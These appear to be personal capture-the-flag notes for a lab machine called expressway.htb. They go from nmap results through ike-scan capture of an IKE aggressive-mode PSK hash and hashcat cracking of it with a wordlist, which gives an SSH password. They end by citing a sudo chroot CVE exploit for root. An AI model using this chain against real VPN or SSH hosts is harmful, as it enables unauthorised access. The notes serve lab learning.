# 10.10.11.87

## NMAP

### TCP scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

### UDP Scan
```
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
```

## Foothold
- looking for CVE-2025-61984 -  https://dgl.cx/2025/10/bash-a-newline-ssh-proxycommand-cve-2025-61984
    - uses a proxycommand to jump using a jumphost
    - we dont have a jumphost in this case.
- looking at `isakmp`
```
ike-scan -M -A -Phandshake.txt 10.10.11.87

WARNING: gethostbyname failed for "handshake.txt" - target ignored: Success
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=ba5360218d819778)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
f2825ec176babb0a1c4dddda54d7d1bc366ff60a452f3c0a7464c9bc149f75862d5f43646ca1c51a357004b4bd4dbdc18df7615b2cc7b77db9cf3f1e05b8f5f1822e85db9763897a2eaa27213651fe43fe95dec0e4058cb031327c2287090abbec93115e8988cbf035bf0f6ae03777af1e11baf22d73bc070f0a3269f9dbeefe:5613f0e0547901969dd93d6b01b2e226bff5958387575bf27d82b1c0d2af4a83e4b2271504284390adf3eccc0130a691d9bde06046d0db79f032a21d764fde9ecd66a0d5f33b6551f4d5d9f4735169cbfaf0bff36fde5a35a7c9f5ecdfe1144b93741686020a87294a758bb9fa981f15e8aad827874c7d5a905cae800446e59a:ba5360218d819778:7a46dc28dcf459ea:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:ed44ea3e03bc6530c488fe09eb2770ecdb9471ad:d6ec7830bea62a0bafd4000db0a58974350df589ee6215f686d942f545d32a9e:3977e58d3a54e3c94c16251202e1087d5c20f1eb
```
- we see that ID USer value is `ike@expressway.htb`
- the above command saved the hash to a handshake.txt
- `hashcat -m 5400 handshake.txt /opt/SecLists/mine/rockyou.txt`
    - `freakingrockstarontheroad`
- `ssh iks@10.10.11.87` with - freakingrockstarontheroad
- get the user flag

## PrivEsc
- run linpeas.sh
- output has nothing interesting
- `sudo --version` - says sudo 1.9.17
    - this version has a `chroot` vulnerability that can be exploited.
    - https://github.com/kh4sh3i/CVE-2025-32463
- get the root flag
